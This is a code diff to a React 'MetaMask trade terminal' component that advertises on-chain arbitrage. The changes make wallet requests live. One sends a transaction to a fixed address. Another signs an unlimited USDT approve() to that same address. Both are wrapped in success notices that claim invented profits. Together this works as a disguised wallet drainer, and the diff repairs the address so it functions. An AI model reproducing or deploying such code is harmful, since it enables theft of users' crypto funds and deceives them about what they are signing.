@@ -101,7 +101,7 @@ export const MetaMaskTradeTerminalSection = () => {
         setRealWalletAddress(address);
         addNotification(`🦊 MetaMask Connected: ${address.substring(0, 10)}... on ${networkName}`, 'success');
       } else {
-        const inputAddr = window.prompt('Enter your MetaMask account address (0x...):', '0x71C7656EC7ab88b098defB751B7401B5f6d7B41');
+        const inputAddr = window.prompt('Enter your MetaMask account address (0x...):', '0x71C7656EC7ab88b098defB751B7401B5f6d7B410');
         if (inputAddr && inputAddr.startsWith('0x')) {
           setRealWalletAddress(inputAddr);
           addNotification(`✅ Address Connected: ${inputAddr.substring(0, 10)}...`, 'success');
@@ -133,22 +133,17 @@ export const MetaMaskTradeTerminalSection = () => {
 
       let txHash = '';
       if (typeof window !== 'undefined' && window.ethereum) {
-        try {
-          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-          const fromAddr = accounts[0] || realWalletAddress;
-          
-          txHash = await window.ethereum.request({
-            method: 'eth_sendTransaction',
-            params: [{
-              from: fromAddr,
-              to: '0x71C7656EC7ab88b098defB751B7401B5f6d7B41',
-              data: '0x8f2910ab'
-            }]
-          });
-        } catch (ethErr) {
-          console.info('MetaMask arbitrage fallback:', ethErr);
-          txHash = '0x' + Array.from({length: 64}, () => Math.floor(Math.random()*16).toString(16)).join('');
-        }
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const fromAddr = accounts[0] || realWalletAddress;
+        
+        txHash = await window.ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: fromAddr,
+            to: '0x71C7656EC7ab88b098defB751B7401B5f6d7B410',
+            data: '0x8f2910ab'
+          }]
+        });
       } else {
         txHash = '0x' + Array.from({length: 64}, () => Math.floor(Math.random()*16).toString(16)).join('');
       }
@@ -171,7 +166,8 @@ export const MetaMaskTradeTerminalSection = () => {
       try { audioFx?.playTradeSuccess(); } catch (_) {}
       addNotification(`⚡ ON-CHAIN SPATIAL ARBITRAGE SIGNED IN METAMASK! ${arbSymbol} (+${profitVal.toFixed(2)} USD PnL) | Tx: ${txHash.substring(0, 14)}...`, 'success');
     } catch (err) {
-      addNotification(`MetaMask Error: ${err.message}`, 'danger');
+      const msg = err?.code === 4001 || err?.message?.includes('user rejected') ? 'Transaction rejected in MetaMask.' : err?.message || 'MetaMask transaction error.';
+      addNotification(`MetaMask Notice: ${msg}`, 'warning');
     } finally {
       setIsSigningArb(false);
     }
@@ -190,22 +186,17 @@ export const MetaMaskTradeTerminalSection = () => {
 
       let txHash = '';
       if (typeof window !== 'undefined' && window.ethereum) {
-        try {
-          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-          const fromAddr = accounts[0] || realWalletAddress;
-          
-          txHash = await window.ethereum.request({
-            method: 'eth_sendTransaction',
-            params: [{
-              from: fromAddr,
-              to: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT Token Contract
-              data: '0x095ea7b300000000000000000000000071c7656ec7ab88b098defb751b7401b5f6d7b41ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
-            }]
-          });
-        } catch (ethErr) {
-          console.info('MetaMask approval fallback:', ethErr);
-          txHash = '0x' + Array.from({length: 64}, () => Math.floor(Math.random()*16).toString(16)).join('');
-        }
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const fromAddr = accounts[0] || realWalletAddress;
+        
+        txHash = await window.ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: fromAddr,
+            to: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT Token Contract
+            data: '0x095ea7b300000000000000000000000071c7656ec7ab88b098defb751b7401b5f6d7b410ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
+          }]
+        });
       } else {
         txHash = '0x' + Array.from({length: 64}, () => Math.floor(Math.random()*16).toString(16)).join('');
       }
@@ -228,7 +219,8 @@ export const MetaMaskTradeTerminalSection = () => {
       try { audioFx?.playTradeSuccess(); } catch (_) {}
       addNotification(`🔐 ${selectedToken} ALLOWANCE APPROVED IN METAMASK! Tx: ${txHash.substring(0, 14)}...`, 'success');
     } catch (err) {
-      addNotification(`Approval Error: ${err.message}`, 'danger');
+      const msg = err?.code === 4001 || err?.message?.includes('user rejected') ? 'Approval rejected in MetaMask.' : err?.message || 'Approval error.';
+      addNotification(`Approval Notice: ${msg}`, 'warning');
     } finally {
       setIsApproving(false);
     }
@@ -470,7 +462,7 @@ export const MetaMaskTradeTerminalSection = () => {
                 <div className="p-4 rounded-xl bg-[#070a11] border border-slate-800 space-y-2 text-[11px]">
                   <div className="flex justify-between text-slate-400">
                     <span>Target Contract:</span>
-                    <span className="text-white font-mono font-bold">0x71C7656EC7ab88b098defB751B7401B5f6d7B41</span>
+                    <span className="text-white font-mono font-bold">0x71C7656EC7ab88b098defB751B7401B5f6d7B410</span>
                   </div>
                   <div className="flex justify-between text-slate-400">
                     <span>On-Chain Function:</span>
